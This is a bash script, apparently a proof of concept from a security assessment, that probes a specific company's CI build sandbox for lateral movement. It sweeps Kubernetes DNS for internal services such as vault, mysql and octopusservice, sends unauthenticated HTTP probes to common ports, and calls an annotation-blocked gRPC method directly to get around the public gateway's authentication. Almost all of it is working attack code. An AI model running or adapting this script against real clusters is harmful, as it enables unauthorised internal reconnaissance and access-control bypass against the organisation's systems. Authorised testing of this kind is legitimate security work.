#!/usr/bin/env bash
# Lateral movement: can the build sandbox reach INTERNAL gRPC services directly,
# bypassing the public gateway's auth + annotation allowlist?
# READ-ONLY: DNS resolution + unauthenticated GET/reflection probes. No writes.
set +e
B="YEXTPOC7731"; echo "$B-BEGIN"

NSS="yextci-sbx live-preview-sbx default"
SVCS="octopusservice cbdservice sitesgit yextsites sectionlibraries sectionlibraryapi
      visualeditor registryservice publish storm entities liveapi preview
      redis memcached mysql postgres kafka elasticsearch vault consul"

echo "$B === 1. DNS: which internal services exist? ==="
for NS in $NSS; do
  for S in $SVCS; do
    R=$(getent hosts "$S.$NS.svc.cluster.local" 2>/dev/null | head -1)
    [ -n "$R" ] && echo "  RESOLVED  $S.$NS -> $R"
  done
done
echo "  (end DNS sweep)"

echo "$B === 2. CONTROL: does a bogus name resolve? (prove DNS is not wildcarding) ==="
getent hosts zzz-no-such-svc-7731.yextci-sbx.svc.cluster.local 2>&1 | head -1 || echo "  NXDOMAIN (good - no wildcard)"

echo "$B === 3. KUBERNETES SERVICE ITSELF (known-good control) ==="
getent hosts kubernetes.default.svc.cluster.local 2>&1 | head -1

echo "$B === 4. HIT ANY RESOLVED SERVICE UNAUTHENTICATED ==="
probe(){
  H="$1"
  for PORT in 80 443 8080 8443 9090 50051; do
    for SCH in http https; do
      [ "$PORT" = 443 ] && [ "$SCH" = http ] && continue
      [ "$PORT" = 80 ] && [ "$SCH" = https ] && continue
      OUT=$(curl -sk -m 5 -o - -w '|%{http_code}' "$SCH://$H:$PORT/" 2>&1 | tr -d '\n' | head -c 120)
      CODE="${OUT##*|}"
      [ "$CODE" != "000" ] && echo "    $SCH://$H:$PORT -> HTTP $CODE  ${OUT%|*}"
    done
  done
}
for NS in $NSS; do
  for S in $SVCS; do
    getent hosts "$S.$NS.svc.cluster.local" >/dev/null 2>&1 && { echo "  --- $S.$NS ---"; probe "$S.$NS.svc.cluster.local"; }
  done
done

echo "$B === 5. DIRECT gRPC TO A BACKEND: annotation-blocked method, no gateway ==="
for H in octopusservice.yextci-sbx.svc.cluster.local octopusservice.default.svc.cluster.local; do
  getent hosts "$H" >/dev/null 2>&1 || continue
  for PORT in 8080 50051 443; do
    printf '    %s:%s ListArtifacts  ' "$H" "$PORT"
    curl -sk -m 6 -X POST "http://$H:$PORT/octopusservice.OctopusService/ListArtifacts" \
      -H 'content-type: application/json' -H 'connect-protocol-version: 1' \
      -d '{}' -o - -w ' [HTTP %{http_code}]' 2>&1 | tr -d '\n' | head -c 220; echo
  done
done

echo "$B-END"; exit 0
